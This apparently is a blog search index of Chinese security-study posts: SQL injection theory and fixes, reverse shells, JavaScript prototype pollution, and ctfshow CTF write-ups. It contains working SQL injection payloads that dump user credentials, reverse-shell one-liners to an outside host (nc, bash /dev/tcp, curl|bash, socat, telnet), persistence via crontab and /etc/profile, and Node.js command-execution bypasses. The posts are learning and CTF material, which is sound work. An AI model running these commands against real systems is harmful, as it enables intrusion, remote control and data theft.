<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>sql注入</title>
      <link href="/2024/04/25/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/04/25/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p><strong>如果传入的SQL语句被恶意用户控制或者篡改，将导致数据库以当前调用者的身份执行预期之外的命令并且返回结果，导致安全问题。</strong></p><h1 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h1><p>通过典型的SQL注射漏洞，黑客是可以根据所能控制的内容在SQL语句的上下文导致不同的结果的，这种不同主要体现在不同的<strong>数据库特性上和细节上</strong>。同时，<strong>后端的数据库的不同导致黑客能利用SQL语句进行的操作也并不相同</strong>，因为很多的数据库在标准的SQL之外也会实现一些自身比较<strong>特别的功能和扩展</strong>，常见的有<strong>Sqlserver的多语句查询</strong>，<strong>Mysql的高权限可以读写系统文件</strong>，<strong>Oracle经常出现的一些系统包提权漏洞</strong>。 即使一些SQL注射本身无法对数据本身进行一些高级别的危害，譬如一些数据库里可能没有存储私密信息，利用SQL查询的结果一样可能<strong>对应用</strong>造成巨大的灾难，因为应用可能将从数据库里提取的信息做一些其他的比较高危险的动作，譬如进行文件读写，这种本身无价值的数据和查询一旦被应用本身赋予较高的意义的话，可能一样导致很高的危害。 评估一个SQL注射的危害需要取决于注射点发生的SQL语句的上下文，SQL语句在应用的上下文，应用在数据库的上下文，综合考虑这些因素来评估一个SQL注射的影响，在无上述利用结果的情况下，通过web应用向数据库传递一些资源要求极高的查询将导致数据库的拒绝服务，这将是黑客可能能进行的最后的利用。</p><h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><p>比较传统的修复方式一般认为是对输入的数据进行有效的过滤，但是由于输入的来源太过广泛，可能来自于数据库，HTTP请求，文件或者其他的数据来源，较难对所有进入的数据在各种场景下进行有效的过滤。 事实上最罪恶的不是数据，而是我们使用数据的方式，最为彻底的修复一定要查找最为彻底的根源，我们可以看到最后的根源在于<strong>对数据和指令的不分离</strong>，所以在修复的时候应该<strong>极力将数据和指令分离</strong>。目前较为提倡的，同时在各种数据库操作框架里体现的方式就是<strong>以填充模板的方式来代替传统的拼接的方式进行数据库查询</strong>，<strong>譬如：</strong></p><pre><code>$SqlTemplate=&quot;select * from members where userid=&#123;userid|int&#125;&quot;;$sb-&gt;PreSql($SqlTemplate,$_GET[&#39;userid&#39;]);</code></pre><p>模板里有关数据及数据自身意义的描述，<strong>PreSql方法</strong>将实现<strong>将模板和数据安全的转换为SQL语句的功能</strong>，以保障最终的安全的实现。</p><h1 id="sql基础"><a href="#sql基础" class="headerlink" title="sql基础"></a>sql基础</h1><p>SQL语法具体不同的数据库还会有自己特有的一些语法结构或者函数等，这些都有可能成为我们注入的工具</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>information_schema数据库是MySQL系统自带的数据库，它提供了数据库元数据的访问方式。</p><p>information_schema数据库里包含有SCHEMATA、TABLES、COLUMNS表，其中SCHEMATA表里面有SCHEMA_NAME（数据库库名）等字段,TABLES表里面有TABLE_SCHEMA（数据库库名）和TABLE_NAME（表名）等字段，COLUMNS表里面有TABLE_SCHEMA（数据库库名）、TABLE_NAME（表名）和COLUMN_NAME（字段名）等字段</p><img src="/2024/04/25/sql%E6%B3%A8%E5%85%A5/193340.png" class=""> <h2 id="基础sql语句"><a href="#基础sql语句" class="headerlink" title="基础sql语句"></a>基础sql语句</h2><p><a href="https://www.w3school.com.cn/sql/sql_syntax.asp">SQL语法</a> 去学！</p><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><pre><code>-- 注释内容#注释内容/*注释内容*/;</code></pre><p>注意：</p><pre><code>1、在get请求中，#号是用来指导浏览器动作的，对服务端无用，而使用--空格的时候在传输过程中最后的空格会被忽略，同样导致无法注释。所以在get请求中注释需要用--+（+会被解码成空格）或--%20或%23（解码后为#）来进行注释2、在post请求中，可以直接使用#来闭合</code></pre><h1 id="注入姿势及绕过"><a href="#注入姿势及绕过" class="headerlink" title="注入姿势及绕过"></a>注入姿势及绕过</h1><h2 id="mysql常见注入姿势"><a href="#mysql常见注入姿势" class="headerlink" title="mysql常见注入姿势"></a>mysql常见注入姿势</h2><p>注：Mysql对大小写不敏感</p><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p><code>UNION</code>可以将前后两个查询语句的结果拼接到一起，但是会自动去重。</p><p><code>UNION ALL</code>功能相同，但是会显示所有数据，不会去重。</p><p>具有类似功能的还有<code>JOIN</code> <a href="https://blog.csdn.net/julielele/article/details/82023577">https://blog.csdn.net/julielele/article/details/82023577</a> 但是是一个对库表等进行连接的语句，可以利用它来进行无列名注入。</p><h4 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h4><p>1、判断是否存在注入，注入是字符型还是数字型，闭合情况，绕过方式</p><pre><code>?id=1 and 1=2  /*数字型会返回假，字符型会由于mysql的隐式转换返回真*/?id=1&#39; ?id=1&quot; ?id=1&#39;) ?id=1&quot;) ?id=1&#39; or 1#?id=1&#39; or 1=0#?id=1&#39; and sleep(5)#?id=1&#39; and 1=2 or &#39;?id=1\</code></pre><p>2、猜测SQL查询语句中的字段数</p><p>使用 order&#x2F;group by 语句，通过往后边拼接数字指导页面报错，可确定字段数量。</p><pre><code>1 order by 31 order by 41&#39; order by 3#1&#39; order by 4#</code></pre><p>使用 union select 联合查询，不断在 union select 后面加数字，直到不报错，即可确定字段数量。</p><pre><code>1 union select 1,2#1 union select 1,2,3#1&#39; union select 1,2#1&#39; union select 1,2,3#</code></pre><p>3、确定显示数据的字段位置</p><pre><code>-1 union select 1,2#-1 union select 1,2,3#-1&#39; union select 1,2#-1&#39; union select 1,2,3#</code></pre><p>4、获取数据</p><p>获取当前数据库名</p><pre><code>-1&#39; union select 1,2,database()--+</code></pre><p>获取当前数据库的表名</p><pre><code>-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code></pre><p>获取表中的字段名</p><pre><code>-1‘ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3--+</code></pre><p>获取数据</p><pre><code>-1&#39; union select 1,2,group_concat(id,0x7c,username,0x7c,password) from users--+-1&#39; union select 1,(select group_concat(id,0x7c,username,0x7c,password) from users),3--+</code></pre><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p><strong>0x01 UPDATEXML (XML_document, XPath_string, new_value);</strong></p><ul><li>第一个参数：XML_document是String格式，为XML文档对象的名称 文中为Doc</li><li>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</li><li>第三个参数：new_value，String格式，替换查找到的符合条件的数据</li></ul><p>由于updatexml的第二个参数需要Xpath格式的字符串，如果不符合xml格式的语法，就可以实现报错注入了。</p><pre><code>&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</code></pre><p>注：concat和group_concat函数的区别：<code>CONCAT</code> 用于连接两个或多个字符串，而 <code>GROUP_CONCAT</code> 用于将组内的值连接成一个字符串并用逗号分隔开来。</p><p><strong>0x02 extractvalue(XML_document,Xpath_string)</strong></p><p>第一个参数可以是anything，第二个参数要求的是Xpath格式的字符串，语法正确是会按照路径<br><code>/该xml文件/要查询的字符串</code> 进行查询，如果我们输入的<code>Xpath_string</code>不对就会报错</p><pre><code>’ and (extractvalue(1,concat(0x7e,substring(hex((select database())),1,5))))</code></pre><p><strong>0x00 floor()（8.x&gt;mysql&gt;5.0）[双查询报错注入]</strong></p><p>函数返回小于或等于指定值（value）的最小整数,取整</p><pre><code>通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor(random(0)*2)的不确定性，即可能为0也可能为1group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</code></pre><pre><code>select count(*), concat(&#39;~&#39;,(select user()),&#39;~&#39;, floor(rand()*2))as a from information_schema.tables group by a;</code></pre><p><strong>双查询报错注入</strong>的原理 </p><p><a href="https://blog.csdn.net/lixiangminghate/article/details/80466257">https://blog.csdn.net/lixiangminghate/article/details/80466257</a></p><p><a href="https://www.freebuf.com/articles/web/250376.html">https://www.freebuf.com/articles/web/250376.html</a></p><p><strong>可以看到这里实际上不光使用了报错注入还是用了刚刚的联合查询，同时还是一个双查询的报错注入，当在一个聚合函数，比如count()函数后面如果使用group by分组语句的话，就可能会把查询的一部分以错误的形式显示出来。但是要多次测试才可以得到报错</strong></p><p>还有一个再复杂一点的，叫派生表，需要使用select 1 from (table name); 这样的语法来报错：</p><pre><code>select 1 from (select count(*), concat(&#39;~&#39;,(select user()),&#39;~&#39;, floor(rand()*2))as a from information_schema.tables group by a)x;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell</title>
      <link href="/2024/02/26/%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2024/02/26/%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h3 id="一、含义"><a href="#一、含义" class="headerlink" title="一、含义"></a>一、含义</h3><p>​客户端连接服务端为正向连接（如：远程桌面、ssh等），反向连接弹shell（即反弹shell为攻击者为服务端，受害者主机为客户端主动连接攻击者的服务端）</p><h3 id="二、适用情况"><a href="#二、适用情况" class="headerlink" title="二、适用情况"></a>二、适用情况</h3><p>​1、目标机因防火墙受限，目标机器只能发送请求，不能接收请求</p><p>​2、目标机端口被占用</p><p>​3、目标机位于局域网</p><p>​4、IP会动态变化</p><p>​5、攻击了一台主机需要在自己的机器上交互式地执行目标机器中的cmd&#x2F;bash命令</p><p>​6、遇到各种AV（AntiVirus，杀软）对正向的连接数据包检测，对出网的检测不严格</p><h3 id="三、原理"><a href="#三、原理" class="headerlink" title="三、原理"></a>三、原理</h3><p>​1.攻击者A开启19111端口TCP服务</p><p>​2.受害者B连接19111端口TCP服务</p><p>​3.A、B建立TCP连接</p><p>​4.A通过TCP服务将待执行命令发送到B</p><p>​5.B执行命令后将结果发送给A</p><h3 id="四、方式"><a href="#四、方式" class="headerlink" title="四、方式"></a>四、方式</h3><h4 id="1、linux反弹shell"><a href="#1、linux反弹shell" class="headerlink" title="1、linux反弹shell"></a>1、linux反弹shell</h4><h5 id="1-netcat反弹shell"><a href="#1-netcat反弹shell" class="headerlink" title="(1)netcat反弹shell"></a>(1)netcat反弹shell</h5><p><strong>攻击机开启本地监听：</strong></p><pre><code>netcat -lvvp 2333</code></pre><p><code>-l</code>: 表示 <code>listen</code> 模式，即使 <code>netcat</code> 以服务器的方式监听连接请求。</p><p><code>-v</code>: 表示 <code>verbose</code> 模式，使 <code>netcat</code> 在执行时显示更多详细信息。（<code>-v</code>: 显示基本的信息。<code>-vv</code>: 显示更详细的信息。<code>-vvv</code>: 显示更加详细和详尽的信息。）</p><p><code>-p 2333</code>: 表示使用指定的端口号，这里是端口号 2333。<code>-p</code> 选项用于指定端口。</p><p><strong>目标机主动连接攻击机：</strong></p><pre><code>netcat 47.xxx.xxx.72 2333 -e /bin/bash# nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</code></pre><p>​整个命令的作用是，<code>netcat</code> 将连接到指定的目标主机（IP地址或主机名为 <code>47.xxx.xxx.72</code>），连接到指定的端口（端口号为 <code>2333</code>），然后在成功连接后，在目标主机（攻击机）上启动一个 Bash shell。这就创建了一个远程 shell 连接，使得用户可以在目标主机上执行命令。</p><p>执行效果如下：</p><img src="/2024/02/26/%E5%8F%8D%E5%BC%B9shell/201908.png" class=""><img src="/2024/02/26/%E5%8F%8D%E5%BC%B9shell/202030.png" class=""><h5 id="2-利用bash反弹shell"><a href="#2-利用bash反弹shell" class="headerlink" title="(2)利用bash反弹shell"></a>(2)利用bash反弹shell</h5><p><strong>攻击机开启本地监听</strong>：</p><pre><code>netcat -lvvp 2333</code></pre><p><strong>目标机主动连接攻击机：</strong></p><pre><code>bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1或bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&quot;# bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1注：/dev/&#123;tcp|udp&#125;/$&#123;host&#125;/$&#123;port&#125; 这个功能只在 bash 中存在，其它的 shell 如 sh、dash、zsh 中是没有的。</code></pre><img src="/2024/02/26/%E5%8F%8D%E5%BC%B9shell/211148.png" class=""><img src="/2024/02/26/%E5%8F%8D%E5%BC%B9shell/211344.png" class=""><table><thead><tr><th>命令</th><th>命令详解</th></tr></thead><tbody><tr><td>bash -i</td><td>表示以交互模式启动 Bash，即允许用户与 shell 进行交互。</td></tr><tr><td>&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333</td><td>Linux环境中所有的内容都是以文件的形式存在的。在这里，它表示将 Bash 的标准输出和标准错误重定向到指定 IP 地址（<code>47.xxx.xxx.72</code>）和端口号（<code>2333</code>），让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</td></tr><tr><td>0&gt;&amp;1</td><td>将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容（也就是目标机的输入由攻击机给出）</td></tr></tbody></table><h5 id="3-Curl-配合"><a href="#3-Curl-配合" class="headerlink" title="(3)Curl 配合"></a>(3)Curl 配合</h5><p>首先，在攻击机的web目录里面创建一个index文件，(index.php或index.html)，内容如下：</p><pre><code>bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</code></pre><p>并开启2333端口的监听</p><p>然后再目标上执行如下，即可反弹shell：</p><pre><code>curl 47.xxx.xxx.72|bash#curl IP|bash 中的IP可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等</code></pre><img src="/2024/02/26/%E5%8F%8D%E5%BC%B9shell/224516.png" class=""><img src="/2024/02/26/%E5%8F%8D%E5%BC%B9shell/224922.png" class=""><h5 id="4-将反弹shell的命令写入定时任务"><a href="#4-将反弹shell的命令写入定时任务" class="headerlink" title="(4)将反弹shell的命令写入定时任务"></a>(4)将反弹shell的命令写入定时任务</h5><p>一般使用cron服务创建定时任务，创建的定时任务文件在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;[crontabs]&#x2F;&lt;username&gt;文件夹里，</p><p>比如，当前用户名为root，我们就要将下面内容写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root 中。(centos系列主机)</p><p>比如，当前用户名为root，我们就要将下面内容写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root 中。(Debian&#x2F;Ubuntu系列主机)</p><p>需要使用crontab -e来编辑任务文件</p><pre><code>*/1  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</code></pre><p>(5)将反弹shell名号了写入&#x2F;etc&#x2F;profile文件</p><p><code>/etc/profile</code> 是一个系统级别的 shell 配置文件，用于设置系统的全局环境变量和执行系统范围的初始化操作。它对所有登录到系统的用户都起作用。</p><p>将以下反弹shell的命写入&#x2F;etc&#x2F;profile文件中，&#x2F;etc&#x2F;profile中的内容会在用户打开bash窗口时执行。</p><pre><code>/bin/bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1 &amp; #最后面那个&amp;为的是防止管理员无法输入命令</code></pre><h5 id="5-利用socat反弹shell"><a href="#5-利用socat反弹shell" class="headerlink" title="(5)利用socat反弹shell"></a>(5)利用socat反弹shell</h5><p>Socat是Linux 下一个多功能的网络工具，名字来由是”Socket CAT”，因此可以看出它是基于socket的，其功能与netcat类似，不过据说可以看做netcat的加强版</p><p>攻击机开启本地监听</p><pre><code>socat TCP-LISTEN:2333 -或nc -lvvp 2333</code></pre><p>目标主机连接攻击机</p><pre><code>socat tcp-connect:47.xxx.xxx.72:2333 exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane</code></pre><h5 id="6-利用Telnet反弹shell"><a href="#6-利用Telnet反弹shell" class="headerlink" title="(6)利用Telnet反弹shell"></a>(6)利用Telnet反弹shell</h5><p><strong>方法一</strong></p><p>攻击机开启本地监听</p><pre><code>nc -lvvp 2333</code></pre><p>目标机主动连接攻击机</p><pre><code>mknod a p; telnet 47.xxx.xxx.72 2333 0&lt;a | /bin/bash 1&gt;a</code></pre><p><strong>方法二</strong></p><p>攻击机开启两个本地监听</p><pre><code>nc -lvvp 2333nc -lvvp 4000</code></pre><p>目标机主动连接攻击机</p><pre><code>telnet 47.101.57.72 2333 | /bin/bash | telnet 47.101.57.72 4000</code></pre><p>获得shell后，在攻击机2333端口的终端上输入的命令会在目标机上执行，执行的回显将通过4000端口的终端显示出来。</p>]]></content>
      
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原型链污染</title>
      <link href="/2024/02/11/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2024/02/11/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h3 id="原型链："><a href="#原型链：" class="headerlink" title="原型链："></a>原型链：</h3><img src="/2024/02/11/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/081350.png" class=""><p>注：__proto__是js非标准属性，[[prototype]]和__proto__意义相同</p><h3 id="原型链污染漏洞："><a href="#原型链污染漏洞：" class="headerlink" title="原型链污染漏洞："></a>原型链污染漏洞：</h3><p>参考链接：</p><p><a href="https://xz.aliyun.com/t/7184?time__1311=n4+xnD0GDtKx9lFD/iT4BKmeQw82ZDmqhD&alichlgref=https://link.csdn.net/?target=https%253A%252F%252Fxz.aliyun.com%252Ft%252F7184%2523toc-0">Node.js常见漏洞学习与总结</a></p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">深入理解 JavaScript Prototype 污染攻击</a></p><p>​在javascript，每一个构造函数都有一个prototype属性，prototype 属性可以向对象添加属性和方法。</p><p>例子：</p><pre><code>object.prototype.name=value</code></pre><p>​在javascript，每一个实例对象都有一个<code>__proto__</code>属性，这个实例属性指向对象的原型对象(即原型)。可以通过以下方式访问得到某一实例对象的原型对象：</p><pre><code>objectname[&quot;__proto__&quot;]objectname.__proto__objectname.constructor.prototype (当读取实例的属性时，如果找不到，就会查找与对象关联的原型中的属性，如果还查不到，就去找原型的原型，一直找到最顶层为止。)</code></pre><p>不同对象所生成的原型链如下(部分)：</p><pre><code>var o = &#123;a: 1&#125;;// o对象直接继承了Object.prototype// 原型链：// o ---&gt; Object.prototype ---&gt; nullvar a = [&quot;yo&quot;, &quot;whadup&quot;, &quot;?&quot;];// 数组都继承于 Array.prototype// 原型链：// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; nullfunction f()&#123;  return 2;&#125;// 函数都继承于 Function.prototype// 原型链：// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</code></pre><p>注意：</p><pre><code>a.__proto__.type=&quot;index&quot;会修改所有对象的原型链的顶端即Object.prototypea.__proto__=&#123;&quot;type&quot;:&quot;index&quot;&#125;会将a的对象原型__proto__的指向重写，使之指向一个新的原型对象，所以它不会改变Object.prototype</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nodejs(ctfshow)</title>
      <link href="/2024/01/17/nodejs(ctfshow)/"/>
      <url>/2024/01/17/nodejs(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h3 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h3><p>下载附件后解压</p><p>有两个文件：login.js user.js</p><pre><code>//login.jsvar findUser = function(name, password)&#123;  return users.find(function(item)&#123;    return name!==&#39;CTFSHOW&#39; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;  &#125;);&#125;;</code></pre><pre><code>//user.jsmodule.exports = &#123;  items: [    &#123;username: &#39;CTFSHOW&#39;, password: &#39;123456&#39;&#125;  ]&#125;;</code></pre><p>他这里name不能等于CTFSHOW，但是获得flag的条件是user等于CTFSHOW，password等于123456，但是toUpperCase可以将小写转换成大写。另外：</p><pre><code>toUpperCase() 函数，字符 ı 会转变为 I ，字符 ſ 会变为 S 。toLowerCase() 函数中，字符 İ 会转变为 i ，字符 K 会转变为 k 。</code></pre><p>所以可以用username&#x3D;ctfshow和password&#x3D;123456绕过</p><h3 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h3><p>源代码发现有个<!-- /?eval= --></p><p>先试试?eval&#x3D;ls，输出一个404找不到文件，所以这里可能是去include一个文件之类的</p><p>但是测试一下发现连index.php都找不到，所以再测试一下eval&#x3D;1输出了1</p><pre><code>在nodejs中，eval()方法用于计算字符串，并把它作为脚本代码来执行，语法为“eval(string)”；如果参数不是字符串，而是整数或者是Function类型，则直接返回该整数或Function。</code></pre><pre><code>Node.js中的child_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require(&#39;child_process&#39;).exec(&#39;&#39;);来进行调用。</code></pre><img src="/2024/01/17/nodejs(ctfshow)/084908.png" class=""><p>发现返回的是[object Object]</p><p>查看文档：<a href="https://nodejs.cn/api/child_process.html">https://nodejs.cn/api/child_process.html</a></p><img src="/2024/01/17/nodejs(ctfshow)/085757.png" class=""><pre><code>法一：系统命令?eval=require(&#39;child_process&#39;).execSync(&#39;ls&#39;)?eval=require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).output?eval=require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl00g.txt&#39;]).stdout?eval=require(&#39;child_process&#39;).execFileSync(&#39;ls&#39;)?eval=require(&#39;child_process&#39;).execFileSync(&#39;ls&#39;,[&#39;-a&#39;])//execFileSync只能执行ls之类，cat不了文件</code></pre><pre><code>法二：文件操作?eval=require(&#39;fs&#39;).readdirSync(&#39;.&#39;)?eval=require(&#39;fs&#39;).readFileSync(&#39;fl00g.txt&#39;)</code></pre><h3 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h3><p>法一：</p><p>经过测试发现这里屏蔽了exec，我们可以利用其他函数绕过</p><pre><code>eval=require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).output?eval=require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl001g.txt&#39;]).output?eval=require(&#39;fs&#39;).readdirSync(&#39;.&#39;)?eval=require(&#39;fs&#39;).readFileSync(&#39;fl001g.txt&#39;)</code></pre><p>法二：</p><pre><code>__filename 表示当前正在执行的脚本的文件名。它将输出文件所在位置的绝对路径，且和命令行参数所指定的文件名不一定相同。 如果在模块中，返回的值是模块文件的路径。 __dirname 表示当前执行脚本所在的目录。</code></pre><p>于是传?eval&#x3D;__filename可以看到路径为&#x2F;app&#x2F;routes&#x2F;index.js</p><p>然后传eval&#x3D;require(‘fs’).readFileSync(‘&#x2F;app&#x2F;routes&#x2F;index.js’,’utf-8’)可以发现过滤了exec和load</p><img src="/2024/01/17/nodejs(ctfshow)/111645.png" class=""><p>我们可以像ssti一样绕过：</p><pre><code>require(&quot;child_process&quot;)[&#39;exe&#39;%2B&#39;cSync&#39;](&#39;ls&#39;)</code></pre><h3 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h3><pre><code>var express = require(&#39;express&#39;);var router = express.Router();var crypto = require(&#39;crypto&#39;);function md5(s) &#123;  return crypto.createHash(&#39;md5&#39;)    .update(s)    .digest(&#39;hex&#39;);&#125;/* GET home page. */router.get(&#39;/&#39;, function(req, res, next) &#123;  res.type(&#39;html&#39;);  var flag=&#39;xxxxxxx&#39;;  var a = req.query.a;  var b = req.query.b;  if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;      res.end(flag);  &#125;else&#123;      res.render(&#39;index&#39;,&#123; msg: &#39;tql&#39;&#125;);  &#125;&#125;);module.exports = router;</code></pre><p>我们自己通过测试可以发现，不同的传参方式会有不同的效果：</p><pre><code>           控制台                  浏览器页面?a=[1]     //[1]                    [1]?a[]=1     //[&#39;1&#39;]                   1?a[x]=1    //&#123;x:1&#125;[object Object]?a=[1,2,3]        //[1,2,3]?a[]=[1,2,3]      //[&#39;1,2,3&#39;]</code></pre><p>法一：</p><pre><code>?a[]=1&amp;b[]=1        //js中数组比较是比较内存引用对象</code></pre><p>法二：</p><pre><code>?a[x]=1&amp;b[v]=2      //&#123;x:1&#125;+flag&#123;xxx&#125;==&#123;v:2&#125;+flag&#123;xxx&#125;==[object Object]flag&#123;xxx&#125;</code></pre><p>注：a[0]&#x3D;1&amp;b[0]&#x3D;2是不行的，因为这样相当于创建了一个数组a&#x3D;[1]和b&#x3D;[2]</p><p>法三：</p><p>通过测试发现：</p><pre><code>console.log(5+[6])    //56console.log(&quot;5&quot;+[6])  //56console.log(5+[3,6])  //53,6</code></pre><p>所以可以这样绕过：</p><pre><code>?a[]=1&amp;b=1</code></pre><h3 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h3><p>先看源码：</p><p>login.js:</p><pre><code>var express = require(&#39;express&#39;);var router = express.Router();var utils = require(&#39;../utils/common&#39;);/* GET home page.  */router.post(&#39;/&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) &#123;  res.type(&#39;html&#39;);  var flag=&#39;flag_here&#39;;  var secert = &#123;&#125;;  var sess = req.session;  let user = &#123;&#125;;  utils.copy(user,req.body);  if(secert.ctfshow===&#39;36dboy&#39;)&#123;    res.end(flag);  &#125;else&#123;    return res.json(&#123;ret_code: 2, ret_msg: &#39;登录失败&#39;+JSON.stringify(user)&#125;);    &#125;  &#125;);module.exports = router;</code></pre><p>其中还require了一个utils&#x2F;common:</p><pre><code>module.exports = &#123;  copy:copy&#125;;function copy(object1, object2)&#123;    for (let key in object2) &#123;        if (key in object2 &amp;&amp; key in object1) &#123;            copy(object1[key], object2[key])        &#125; else &#123;            object1[key] = object2[key]        &#125;    &#125;  &#125;</code></pre><p>分析可知，只要secert.ctfshow&#x3D;&#x3D;&#x3D;’36dboy’就可以得到flag，我们没法操作secert，但我们可以通过操作user变量，达到原型链污染</p><p>这里先看到利用点，这里copy的意思就是将object1和object2对比，如果存在没有的属性，就会将属性和值给object1，这里他user和secert对象都是指向Object.prototype，所以只要user.<strong>proto</strong>.ctfshow等于36dboy就可以了</p><pre><code>payload&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</code></pre><img src="/2024/01/17/nodejs(ctfshow)/150925.png" class=""><h3 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h3>]]></content>
      
      
      
        <tags>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc(ctfshow)</title>
      <link href="/2023/11/02/misc(ctfshow)/"/>
      <url>/2023/11/02/misc(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h3 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h3><p>打开图片就能看到flag</p><h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p>打开压缩包有一个.txt文件，用文本模式看了一下没发现什么有用的消息，用010editor打开查看16进制，发现文件头是<strong>89 50 4E 47</strong>,这是png的文件头</p><img src="/2023/11/02/misc(ctfshow)/203313.png" class=""><p>所以把文件后缀改为.png，得到flag</p><p>还可以用python来提取图片中的文字</p><pre><code>import pytesseractfrom PIL import Imageimage=Image.open(&#39;C:/Users/534545/Desktop/misc2/misc2.png&#39;)text=pytesseract.image_to_string(image)print(text)</code></pre><h3 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h3><p>压缩包里有个bpg格式的文件，bpg就是一种图片的后缀，可以用很多图片查看器查看</p><p>这里尝试下载一个图片查看器 Honeyview 。</p><img src="/2023/11/02/misc(ctfshow)/234055.png" class=""><h3 id="misc4"><a href="#misc4" class="headerlink" title="misc4"></a>misc4</h3><p>有6个txt文件，可以通过文件头来判断文件的类型</p><pre><code>JPEG (jpg) 文件头：FF D8 FF  文件尾：FF D9PNG (png)，文件头：89504E47Windows Bitmap (bmp)， 文件头：424D 文件尾：GIF (gif)，文件头：47494638XML (xml)，文件头：3C3F786D6CHTML (html)，文件头：68746D6C3EMS Word/Excel (xls.or.doc)，文件头：D0CF11E0MS Access (mdb)，文件头：5374616E64617264204AAdobe Acrobat (pdf)，文件头：255044462D312EWindows Password (pwl)，文件头：E3828596ZIP Archive (zip)，文件头：504B0304RAR Archive (rar)，文件头：52617221Wave (wav)，文件头：57415645AVI (avi)，文件头：41564920TIFF (tif)， 文件头：49492A00 